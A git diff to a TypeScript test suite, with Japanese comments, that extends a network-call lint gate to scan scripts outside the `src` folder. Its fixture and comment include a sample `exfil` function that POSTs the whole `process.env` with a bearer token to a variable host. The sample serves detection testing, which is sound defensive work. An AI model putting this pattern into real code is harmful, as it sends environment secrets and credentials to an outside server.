@@ -20,14 +20,20 @@ const req = createRequire(import.meta.url);
 const gate = req('../../../scripts/lint-network-targets.cjs') as {
   templateFindings: (rel: string, lines: string[]) => { file: string; line: number; template: string }[];
   bareSendFindings: (rel: string, lines: string[]) => { file: string; line: number; dest: string }[];
+  outsideSendFindings: (rel: string, lines: string[]) => { file: string; line: number; call: string }[];
+  outsidePopulation: () => string[];
   hasConstantHost: (template: string) => boolean;
   REVIEWED: unknown[];
   REVIEWED_VARIABLE_DESTINATIONS: unknown[];
+  REVIEWED_OUTSIDE_SENDS: { file: string; needle: string; guard: string }[];
   NETWORK_CALL_NAMES: string[];
+  OUTSIDE_SEND_NAMES: string[];
+  OUTSIDE_POPULATION_FLOOR: number;
 };
 
 const tpl = (src: string) => gate.templateFindings('src/main/clients/x.ts', src.split('\n'));
 const bare = (src: string) => gate.bareSendFindings('src/main/clients/x.ts', src.split('\n'));
+const outside = (src: string) => gate.outsideSendFindings('scripts/x.cjs', src.split('\n'));
 
 describe('lint:network-targets — 外側の証人', () => {
   it.each([
@@ -97,5 +103,95 @@ describe('lint:network-targets — 外側の証人', () => {
   it('★ レビュー済みの台帳が空にされていない', () => {
     expect(gate.REVIEWED.length).toBeGreaterThanOrEqual(10);
     expect(gate.REVIEWED_VARIABLE_DESTINATIONS.length).toBeGreaterThanOrEqual(1);
+  });
+
+  /*
+   * **`src` の外の網の口** (2026-09-20 · パス 342)。
+   *
+   * 上の 2 つの検出器は `ROOTS`（= `src`）の `.ts` / `.tsx` しか読まない。
+   * 2026-09-20 の実測: `scripts/_control342.cjs` に
+   *
+   *     fetch(`https://${host}/v1/collect`, {
+   *       headers: { Authorization: `Bearer ${token}` },
+   *       body: JSON.stringify({ env: process.env }),
+   *     })
+   *
+   * を置くと**この門を含む 37 ゲートすべてが exit 0**、同じコードを `src/` へ
+   * 置くとこの門が鳴った。**差は検出器ではなく走査範囲だけ**である。
+   *
+   * 直し方は「`ROOTS` を広げる」ではない —— 広げると 20 件出て真陽性は 0 件
+   * (ゲート自身の self-test の標本)、かつ `src` の外の実物 3 件は**どれも
+   * 送り先が素の識別子**なので `BARE_SEND` が意図して見ない。つまり
+   * **広げてもこの 3 つは 1 件も見えない。** 母集団が小さいことを使って
+   * 「変数の送り先だけ」ではなく**全件**を台帳に載せる形にした。
+   */
+  describe('src の外の網の口 (パス 342)', () => {
+    it('★ 対照そのもの: CI で走る script の「可変ホスト + 資格情報 + process.env」を拾う', () => {
+      const found = outside(
+        [
+          'async function exfil(host, token) {',
+          '  return fetch(`https://${host}/v1/collect`, {',
+          "    method: 'POST',",
+          '    headers: { Authorization: `Bearer ${token}` },',
+          '    body: JSON.stringify({ env: process.env }),',
+          '  });',
+          '}',
+        ].join('\n'),
+      );
+      expect(found).toHaveLength(1);
+      expect(found[0]!.line).toBe(2);
+    });
+
+    it.each([
+      ['素の識別子の送り先 (BARE_SEND が意図して見ない形)', 'const r = await fetch(url, init);'],
+      ['差し替え可能な既定引数', 'const res = await fetchImpl(current, init);'],
+      ['プロパティ経由の呼び出し', 'await deps.fetchImpl(current, init);'],
+      ['Node の HTTP API', 'https.request(opts, cb);'],
+    ])('★ 陽性: %s', (_n, line) => {
+      expect(outside(line)).toHaveLength(1);
+    });
+
+    it.each([
+      // 落とさないと台帳が 14 行になり、本当に見たい 3 件が埋もれる (実測)。
+      ['ゲート自身の self-test の文字列標本', "  ['素の fetch', 'await fetch(`https://${h}/x`);', true],"],
+      ['行コメント', '// await fetch(url, init);'],
+      ['通信でない呼び出し', 'await render(url, init);'],
+      ['名前の一部に含まれるだけ', 'await prefetchAll(url);'],
+    ])('陰性: %s は報告されない', (_n, line) => {
+      expect(outside(line)).toHaveLength(0);
+    });
+
+    it('陰性: ブロックコメントの中は報告されない', () => {
+      expect(outside(['/*', ' * await fetch(url, init);', ' */'].join('\n'))).toHaveLength(0);
+    });
+
+    it('★ 母集団は `src` の外だけで、床を持つ (走査が死んで 0 件を「健全」と読まないため)', () => {
+      const pop = gate.outsidePopulation();
+      expect(pop.length).toBeGreaterThanOrEqual(gate.OUTSIDE_POPULATION_FLOOR);
+      expect(pop.every((f) => !f.startsWith('src/'))).toBe(true);
+      // 生成物 (dist/ dist-electron/) は git が無視するので入らない。
+      expect(pop.some((f) => f.startsWith('dist'))).toBe(false);
+      // 実在する根が消えていないこと (向きを持った標本)。
+      expect(pop).toContain('scripts/ollama-cli.cjs');
+      expect(pop).toContain('assets/sw.js');
+    });
+
+    it('★ 台帳の 3 件は、守りを実際に書いている (空欄を理由として通さない)', () => {
+      expect(gate.REVIEWED_OUTSIDE_SENDS).toHaveLength(3);
+      for (const row of gate.REVIEWED_OUTSIDE_SENDS) {
+        expect(row.guard.length).toBeGreaterThan(40);
+        // 「あとで決める」を理由の欄に置けない (パス 336 と同じ規則)。
+        expect(row.guard).not.toMatch(/分かる人が決め|わかる人が決め|誰かが決め|要検討|TODO/);
+      }
+      // 針が実際にその文面へ当たることを、同じ検査の中で標本で確かめる。
+      expect('分かる人が決めること').toMatch(/分かる人が決め|わかる人が決め|誰かが決め|要検討|TODO/);
+      expect('TODO: あとで').toMatch(/分かる人が決め|わかる人が決め|誰かが決め|要検討|TODO/);
+    });
+
+    it('★ 見る名前の一覧は `src` 側の一覧を含み、Node 側の綴りを足している', () => {
+      for (const n of gate.NETWORK_CALL_NAMES) expect(gate.OUTSIDE_SEND_NAMES).toContain(n);
+      expect(gate.OUTSIDE_SEND_NAMES).toContain('fetchImpl');
+      expect(gate.OUTSIDE_SEND_NAMES).toContain('https.request');
+    });
   });
 });
